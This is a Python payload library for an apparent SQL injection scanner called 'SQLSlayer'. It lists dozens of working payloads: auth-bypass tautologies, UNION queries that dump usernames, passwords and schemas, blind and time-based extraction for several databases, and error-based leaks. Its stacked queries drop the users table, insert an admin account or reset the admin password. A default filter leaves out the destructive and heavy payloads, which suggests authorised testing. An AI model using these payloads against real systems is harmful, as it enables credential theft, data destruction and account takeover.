"""
agent/payload_engine.py — Comprehensive SQL Injection Payload Library
Covers OWASP Top-10 SQLi vectors, CWE-89
SQLSlayer

Categories:
  - IN_BAND_UNION    : UNION-based extraction
  - BOOLEAN_BLIND    : True/False condition inference
  - TIME_BASED       : Delay-based (SQLite/MySQL/MSSQL/PG variants)
  - ERROR_BASED      : Force DB errors leaking metadata
  - STACKED          : Multiple statement execution
  - COMMENT_STRIP    : Authentication bypass via comment injection
  - HEADER_INJECT    : Via HTTP headers
  - ORDERBY          : ORDER BY clause injection
  - SECOND_ORDER     : Stored then re-evaluated payloads
"""
from dataclasses import dataclass, field
from typing import List, Optional
from enum import Enum


class PayloadCategory(str, Enum):
    IN_BAND_UNION   = "IN_BAND_UNION"
    BOOLEAN_BLIND   = "BOOLEAN_BLIND"
    TIME_BASED      = "TIME_BASED"
    ERROR_BASED     = "ERROR_BASED"
    STACKED         = "STACKED"
    COMMENT_STRIP   = "COMMENT_STRIP"
    HEADER_INJECT   = "HEADER_INJECT"
    ORDERBY         = "ORDERBY"
    SECOND_ORDER    = "SECOND_ORDER"
    TAUTOLOGY       = "TAUTOLOGY"


@dataclass
class Payload:
    value: str
    category: PayloadCategory
    description: str
    severity: str           # CRITICAL | HIGH | MEDIUM | LOW
    db_target: str = "ANY"  # ANY | SQLITE | MYSQL | MSSQL | POSTGRES
    expected_indicator: Optional[str] = None   # string to look for in response
    destructive: bool = False  # mutates data/schema (DROP/INSERT/UPDATE/CREATE)
    heavy: bool = False        # resource-intensive (large randomblob → DoS risk)


# ─────────────────────────────────────────────────────────────────────────────
# MASTER PAYLOAD REGISTRY
# ─────────────────────────────────────────────────────────────────────────────
PAYLOADS: List[Payload] = [

    # ── COMMENT STRIP / AUTH BYPASS ──────────────────────────────────────────
    Payload("' OR '1'='1", PayloadCategory.COMMENT_STRIP,
            "Classic tautology – single quote bypass", "CRITICAL", expected_indicator="ok"),
    Payload("' OR '1'='1'--", PayloadCategory.COMMENT_STRIP,
            "Tautology with inline comment", "CRITICAL", expected_indicator="ok"),
    Payload("' OR '1'='1'/*", PayloadCategory.COMMENT_STRIP,
            "Tautology with block comment", "CRITICAL"),
    Payload("admin'--", PayloadCategory.COMMENT_STRIP,
            "Username bypass – comment strips password check", "CRITICAL"),
    Payload("admin' #", PayloadCategory.COMMENT_STRIP,
            "MySQL hash comment auth bypass", "CRITICAL", db_target="MYSQL"),
    Payload("') OR ('1'='1", PayloadCategory.COMMENT_STRIP,
            "Parenthesis variant tautology", "CRITICAL"),
    Payload("' OR 1=1--", PayloadCategory.COMMENT_STRIP,
            "Numeric tautology with comment", "CRITICAL"),
    Payload("\" OR \"\"=\"", PayloadCategory.COMMENT_STRIP,
            "Double-quote variant", "HIGH"),

    # ── TAUTOLOGY ────────────────────────────────────────────────────────────
    Payload("1 OR 1=1", PayloadCategory.TAUTOLOGY,
            "Numeric tautology – no quote needed", "CRITICAL"),
    Payload("1; SELECT 1", PayloadCategory.TAUTOLOGY,
            "Minimal stacked tautology", "HIGH"),
    Payload("1 OR 'x'='x", PayloadCategory.TAUTOLOGY,
            "String tautology no close quote", "HIGH"),

    # ── IN-BAND UNION ────────────────────────────────────────────────────────
    Payload("' UNION SELECT NULL--", PayloadCategory.IN_BAND_UNION,
            "Column-count probe (1 col)", "HIGH"),
    Payload("' UNION SELECT NULL,NULL--", PayloadCategory.IN_BAND_UNION,
            "Column-count probe (2 cols)", "HIGH"),
    Payload("' UNION SELECT NULL,NULL,NULL--", PayloadCategory.IN_BAND_UNION,
            "Column-count probe (3 cols)", "HIGH"),
    Payload("' UNION SELECT 1,username,password FROM users--", PayloadCategory.IN_BAND_UNION,
            "Dump credentials via UNION", "CRITICAL", expected_indicator="admin"),
    Payload("' UNION SELECT 1,2,sqlite_version()--", PayloadCategory.IN_BAND_UNION,
            "DB version fingerprint via UNION", "HIGH", db_target="SQLITE"),
    Payload("' UNION SELECT 1,name,sql FROM sqlite_master--", PayloadCategory.IN_BAND_UNION,
            "Schema dump via sqlite_master", "CRITICAL", db_target="SQLITE"),
    Payload("' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
            PayloadCategory.IN_BAND_UNION,
            "MySQL table enumeration", "CRITICAL", db_target="MYSQL"),
    Payload("1 UNION ALL SELECT NULL,NULL,NULL--", PayloadCategory.IN_BAND_UNION,
            "UNION ALL variant", "HIGH"),
    Payload("1 UNION SELECT 1,group_concat(username||':'||password),3 FROM users--",
            PayloadCategory.IN_BAND_UNION,
            "Credential dump with concat", "CRITICAL", db_target="SQLITE"),

    # ── BOOLEAN BLIND ────────────────────────────────────────────────────────
    Payload("1 AND 1=1", PayloadCategory.BOOLEAN_BLIND,
            "True condition – should return same as baseline", "HIGH"),
    Payload("1 AND 1=2", PayloadCategory.BOOLEAN_BLIND,
            "False condition – response should differ from baseline", "HIGH"),
    Payload("1 AND SUBSTRING(username,1,1)='a'", PayloadCategory.BOOLEAN_BLIND,
            "Character extraction probe", "HIGH"),
    Payload("1 AND (SELECT COUNT(*) FROM users)>0", PayloadCategory.BOOLEAN_BLIND,
            "Row-count existence check", "HIGH"),
    Payload("1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1",
            PayloadCategory.BOOLEAN_BLIND,
            "CASE-WHEN boolean inference", "HIGH"),
    Payload("' AND '1'='1", PayloadCategory.BOOLEAN_BLIND,
            "String boolean true", "MEDIUM"),
    Payload("' AND '1'='2", PayloadCategory.BOOLEAN_BLIND,
            "String boolean false", "MEDIUM"),
    Payload("1 AND ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))>64",
            PayloadCategory.BOOLEAN_BLIND,
            "ASCII comparison for blind extraction", "CRITICAL"),

    # ── TIME BASED ───────────────────────────────────────────────────────────
    Payload("1 AND (SELECT randomblob(500000000))", PayloadCategory.TIME_BASED,
            "SQLite CPU-delay via randomblob", "CRITICAL", db_target="SQLITE", heavy=True),
    Payload("1; SELECT CASE WHEN (1=1) THEN randomblob(999999999) ELSE 0 END",
            PayloadCategory.TIME_BASED,
            "SQLite conditional delay", "CRITICAL", db_target="SQLITE", heavy=True),
    Payload("1' AND SLEEP(3)--", PayloadCategory.TIME_BASED,
            "MySQL SLEEP delay", "CRITICAL", db_target="MYSQL"),
    Payload("1; WAITFOR DELAY '0:0:3'--", PayloadCategory.TIME_BASED,
            "MSSQL WAITFOR delay", "CRITICAL", db_target="MSSQL"),
    Payload("1; SELECT pg_sleep(3)--", PayloadCategory.TIME_BASED,
            "PostgreSQL pg_sleep delay", "CRITICAL", db_target="POSTGRES"),
    Payload("1 AND (SELECT * FROM (SELECT SLEEP(3))a)--", PayloadCategory.TIME_BASED,
            "MySQL subquery sleep", "CRITICAL", db_target="MYSQL"),

    # ── ERROR BASED ──────────────────────────────────────────────────────────
    Payload("'", PayloadCategory.ERROR_BASED,
            "Single quote – syntax error reveals DB type", "MEDIUM",
            expected_indicator="error"),
    Payload("''", PayloadCategory.ERROR_BASED,
            "Double single-quote – balanced but may reveal info", "LOW"),
    Payload("1/0", PayloadCategory.ERROR_BASED,
            "Division by zero – error-based signal", "MEDIUM"),
    Payload("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            PayloadCategory.ERROR_BASED,
            "MySQL EXTRACTVALUE error-based extraction", "CRITICAL", db_target="MYSQL"),
    Payload("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
            PayloadCategory.ERROR_BASED,
            "MySQL UPDATEXML error-based extraction", "CRITICAL", db_target="MYSQL"),
    Payload("1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
            PayloadCategory.ERROR_BASED,
            "MSSQL CONVERT error extraction", "CRITICAL", db_target="MSSQL"),

    # ── STACKED QUERIES ──────────────────────────────────────────────────────
    Payload("1; DROP TABLE users--", PayloadCategory.STACKED,
            "Classic Bobby Tables – table drop", "CRITICAL", destructive=True),
    Payload("1; INSERT INTO users(username,password,role) VALUES('hacker','pwned','admin')--",
            PayloadCategory.STACKED,
            "Insert admin user via stacked query", "CRITICAL", destructive=True),
    Payload("1; UPDATE users SET password='compromised' WHERE username='admin'--",
            PayloadCategory.STACKED,
            "Admin password reset via stacked query", "CRITICAL", destructive=True),
    Payload("1; CREATE TABLE sqli_test(id INT)--", PayloadCategory.STACKED,
            "Schema modification via stacked query", "HIGH", destructive=True),

    # ── ORDER BY INJECTION ───────────────────────────────────────────────────
    Payload("1 ASC", PayloadCategory.ORDERBY,
            "Valid ORDER BY ASC – baseline", "LOW"),
    Payload("1 DESC", PayloadCategory.ORDERBY,
            "Valid ORDER BY DESC – baseline", "LOW"),
    Payload("(SELECT CASE WHEN (1=1) THEN username ELSE score END)",
            PayloadCategory.ORDERBY,
            "Conditional ORDER BY extraction", "HIGH"),
    Payload("(SELECT 1 FROM users WHERE username='admin' AND SLEEP(3))",
            PayloadCategory.ORDERBY,
            "Time-based ORDER BY blind", "CRITICAL", db_target="MYSQL"),
    Payload("1,(SELECT randomblob(999999999))", PayloadCategory.ORDERBY,
            "SQLite time-based in ORDER BY", "CRITICAL", db_target="SQLITE", heavy=True),

    # ── HEADER INJECTION ─────────────────────────────────────────────────────
    Payload("Mozilla/5.0' OR '1'='1", PayloadCategory.HEADER_INJECT,
            "User-Agent tautology injection", "CRITICAL"),
    Payload("127.0.0.1' UNION SELECT 1,username,password FROM users--",
            PayloadCategory.HEADER_INJECT,
            "X-Forwarded-For UNION dump", "CRITICAL"),
    Payload("' OR 1=1--", PayloadCategory.HEADER_INJECT,
            "X-Forwarded-For auth bypass", "CRITICAL"),

    # ── SECOND ORDER ─────────────────────────────────────────────────────────
    Payload("admin'--", PayloadCategory.SECOND_ORDER,
            "Stored payload executed on profile read", "CRITICAL"),
    Payload("' UNION SELECT username,password,3 FROM users--",
            PayloadCategory.SECOND_ORDER,
            "Stored UNION payload", "CRITICAL"),
]


def filter_safe(payloads: List[Payload], allow_destructive: bool = False) -> List[Payload]:
    """Return only safe payloads unless destructive testing is explicitly allowed.

    In safe mode (default) this drops data/schema-mutating payloads (DROP, INSERT,
    UPDATE, CREATE) and resource-heavy payloads (large randomblob) so a scan
    cannot damage or DoS a live target.
    """
    if allow_destructive:
        return list(payloads)
    return [p for p in payloads if not p.destructive and not p.heavy]


def get_payloads_by_category(category: PayloadCategory) -> List[Payload]:
    return [p for p in PAYLOADS if p.category == category]


def get_payloads_by_severity(severity: str) -> List[Payload]:
    return [p for p in PAYLOADS if p.severity == severity]


def get_all_categories() -> List[PayloadCategory]:
    return list(PayloadCategory)


def payload_summary() -> dict:
    summary = {}
    for cat in PayloadCategory:
        payloads = get_payloads_by_category(cat)
        summary[cat.value] = {
            "count": len(payloads),
            "critical": sum(1 for p in payloads if p.severity == "CRITICAL"),
            "high":     sum(1 for p in payloads if p.severity == "HIGH"),
        }
    return summary


if __name__ == "__main__":
    print(f"Total payloads: {len(PAYLOADS)}")
    for k, v in payload_summary().items():
        print(f"  {k:20s}: {v['count']} total, {v['critical']} critical")
